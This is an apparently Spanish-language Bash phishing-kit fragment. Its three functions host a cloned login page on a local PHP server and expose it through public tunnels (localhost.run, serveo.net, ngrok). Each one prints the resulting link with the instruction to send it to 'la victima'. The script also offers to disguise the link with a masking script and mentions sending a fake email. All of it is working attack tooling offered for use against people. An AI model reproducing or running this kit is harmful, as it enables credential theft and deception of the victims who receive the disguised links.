localrun(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f run ]];then
                rm run
        fi
        
        $(which sh) -c 'ssh -R 80:localhost:$port nokey@localhost.run 2> /dev/null > run ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo local.run..."
        envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
        
        if [[ $envialink == "" ]];then
        #        echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
         #       exit 1
       # else
         #       echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima,el segundo link con https\e[0;32m"
                #disfraz
                sleep 5
                echo -e "$v[$b*$v]$b Deseas ocultar el link?\e[0;32m"
		read -p $'\e[1;39m[\e[1;39m*\e[1;39m]\e[1;32m Elige una opción si/no:\e[1;39m ' cho
            
       		
		case "$cho" in

		s|S|Si|si|SI)
		lnk=$?
		if [ "$lnk" ==  "0" ];then
		cd $OLDPWD
		gnome-terminal -e 'bash enmascarar.sh' 2> /dev/null
		killall -2 ssh 2> /dev/null 
		gnome-terminal -e 'ssh -R 80:localhost:3333 localhost.run ' 2> /dev/null
		cd $ruta_carpeta
		
                fi
		;;

		n|no|No|NO)
		killall -2 ssh 2> /dev/null 
		gnome-terminal -e 'ssh -R 80:localhost:3333 localhost.run ' 2> /dev/null
		esac
                
                check
                
                
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check_found
        fi
        if [[ -f run ]]; then
                rm run
        fi
}


serveo(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
	echo
        php -S localhost:3333 > /dev/null 2>&1 & 
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f link ]]; then
                rm -rf link
        fi
        
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo serveo..."
        sleep 5
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 5
        envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz

        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check
                check_found
        fi
        if [[ -f link ]]; then
                rm -rf link
        fi
}

ngrok(){
	if [[ $clonada == "si" ]];then
		descargar_pagina
	fi
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        cd $OLDPWD
        echo -e "$v[$b*$v]$b No cierres la terminal de Ngrok"
        sleep 5
        sleep 5
        envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[*]\.ngrok.io")
        if [[ $envialink == "" ]];then
        #       echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
	#	exit 1
        #else
                
               
                echo -e "$v[$b*$v]$b Envia a la victima,el segundo link con https\e[0;32m"
                sleep 5
                cd $ruta_carpeta
                #disfraz
                echo -e "$v[$b*$v]$b Deseas ocultar/enmascarar el link?\e[0;32m"
		read -p $'\e[1;39m[\e[1;39m*\e[1;39m]\e[1;32m Elige una opción si/no:\e[1;39m ' cho
            
       		
		case "$cho" in

		s|S|Si|si|SI)
		lnk=$?
		if [ "$lnk" ==  "0" ];then
		cd $OLDPWD
		gnome-terminal -e 'bash enmascarar.sh' 2> /dev/null
		killall -2 ngrok 2> /dev/null 
		gnome-terminal -e './ngrok http 3333' 2> /dev/null
		cd $ruta_carpeta



		fi
		;;

		n|no|No|NO)
		killall -2 ngrok 2> /dev/null 
		cd $OLDPWD
		gnome-terminal -e './ngrok http 3333' 2> /dev/null
		cd $ruta_carpeta
		esac
		
                
               
                
                
                
                
                
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
        check
        check_found
	fi
}
